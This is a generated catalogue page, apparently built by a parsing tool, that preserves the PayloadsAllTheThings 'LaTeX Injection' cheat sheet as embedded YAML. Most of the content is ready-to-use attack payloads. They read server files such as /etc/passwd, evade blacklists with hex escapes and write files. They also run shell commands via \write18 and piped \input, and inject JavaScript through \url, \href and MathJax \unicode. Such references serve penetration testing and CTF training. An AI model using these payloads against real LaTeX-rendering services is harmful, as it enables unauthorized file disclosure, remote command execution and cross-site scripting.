---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# LaTeX Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-latex-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/LaTeX Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [LaTeX Injection](../../topics/latex-injection/latex-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-latex-injection-readme |
| name | LaTeX Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# LaTeX Injection\n\n> LaTeX Injection is a type of injection attack where malicious content is injected into LaTeX\
  \ documents. LaTeX is widely used for document preparation and typesetting, particularly in academia, for producing high-quality\
  \ scientific and mathematical documents. Due to its powerful scripting capabilities, LaTeX can be exploited by attackers\
  \ to execute arbitrary commands if proper safeguards are not in place.\n\n## Summary\n\n* [File Manipulation](#file-manipulation)\n\
  \    * [Read File](#read-file)\n    * [Write File](#write-file)\n* [Command Execution](#command-execution)\n* [Cross Site\
  \ Scripting](#cross-site-scripting)\n* [Labs](#labs)\n* [References](#references)\n\n## File Manipulation\n\n### Read File\n\
  \nAttackers can read the content of sensitive files on the server.\n\nRead file and interpret the LaTeX code in it:\n\n\
  ```tex\n\\input{/etc/passwd}\n\\include{somefile} # load .tex file (somefile.tex)\n```\n\nRead single lined file:\n\n```tex\n\
  \\newread\\file\n\\openin\\file=/etc/issue\n\\read\\file to\\line\n\\text{\\line}\n\\closein\\file\n```\n\nRead multiple\
  \ lined file:\n\n```tex\n\\lstinputlisting{/etc/passwd}\n\\newread\\file\n\\openin\\file=/etc/passwd\n\\loop\\unless\\ifeof\\\
  file\n    \\read\\file to\\fileline\n    \\text{\\fileline}\n\\repeat\n\\closein\\file\n```\n\nRead text file, **without**\
  \ interpreting the content, it will only paste raw file content:\n\n```tex\n\\usepackage{verbatim}\n\\verbatiminput{/etc/passwd}\n\
  ```\n\nIf injection point is past document header (`\\usepackage` cannot be used), some control\ncharacters can be deactivated\
  \ in order to use `\\input` on file containing `$`, `#`,\n`_`, `&`, null bytes, ... (eg. perl scripts).\n\n```tex\n\\catcode\
  \ `\\$=12\n\\catcode `\\#=12\n\\catcode `\\_=12\n\\catcode `\\&=12\n\\input{path_to_script.pl}\n```\n\nTo bypass a blacklist\
  \ try to replace one character with it's unicode hex value.\n\n* ^^41 represents a capital A\n* ^^7e represents a tilde\
  \ (~) note that the ‘e’ must be lower case\n\n```tex\n\\lstin^^70utlisting{/etc/passwd}\n```\n\n### Write File\n\nWrite\
  \ single lined file:\n\n```tex\n\\newwrite\\outfile\n\\openout\\outfile=cmd.tex\n\\write\\outfile{Hello-world}\n\\write\\\
  outfile{Line 2}\n\\write\\outfile{I like trains}\n\\closeout\\outfile\n```\n\n## Command Execution\n\nThe output of the\
  \ command will be redirected to stdout, therefore you need to use a temp file to get it.\n\n```tex\n\\immediate\\write18{id\
  \ > output}\n\\input{output}\n```\n\nIf you get any LaTex error, consider using base64 to get the result without bad characters\
  \ (or use `\\verbatiminput`):\n\n```tex\n\\immediate\\write18{env | base64 > test.tex}\n\\input{text.tex}\n```\n\n```tex\n\
  \\input|ls|base64\n\\input{|\"/bin/hostname\"}\n```\n\n## Cross Site Scripting\n\nFrom [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)\n\
  \n```tex\n\\url{javascript:alert(1)}\n\\href{javascript:alert(1)}{placeholder}\n```\n\nIn [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)\n\
  \n```tex\n\\unicode{<img src=1 onerror=\"<ARBITRARY_JS_CODE>\">}\n```\n\n## Labs\n\n* [Root Me - LaTeX - Input](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)\n\
  * [Root Me - LaTeX - Command Execution](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)\n\n##\
  \ References\n\n* [Hacking with LaTeX - Sebastian Neef - March 10, 2016](https://web.archive.org/web/20260209043241/https://0day.work/hacking-with-latex/)\n\
  * [Latex to RCE, Private Bug Bounty Program - Yasho - July 6, 2018](https://web.archive.org/web/20210117203905/https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)\n\
  * [Pwning coworkers thanks to LaTeX - scumjr - November 28, 2016](https://web.archive.org/web/20161130151956/https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)"
_relative_path: LaTeX Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/LaTeX Injection/README.md
````
